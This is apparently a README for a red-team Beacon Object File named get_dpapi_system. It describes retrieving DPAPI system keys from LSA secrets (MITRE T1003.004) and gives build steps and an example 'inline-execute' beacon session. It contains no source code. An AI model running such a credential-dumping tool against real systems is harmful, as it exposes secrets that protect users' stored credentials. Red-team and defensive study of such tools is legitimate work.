# get_dpapi_system

Retrieves DPAPI system keys from LSA secrets by querying `DPAPI_SYSTEM` and `G$BCKUPKEY_PREFERRED` private data via `LsaRetrievePrivateData`.

## MITRE ATT&CK

- T1003.004 - OS Credential Dumping: LSA Secrets

## Arguments

No arguments.

## Build

```text
cd bofs/sa/get_dpapi_system
cargo make
```

## Example

```text
beacon> inline-execute /path/to/get_dpapi_system.x64.o
SUCCESS.
get_dpapi_system: Retrieving DPAPI system keys from LSA secrets
No data returned for '<value>'
```
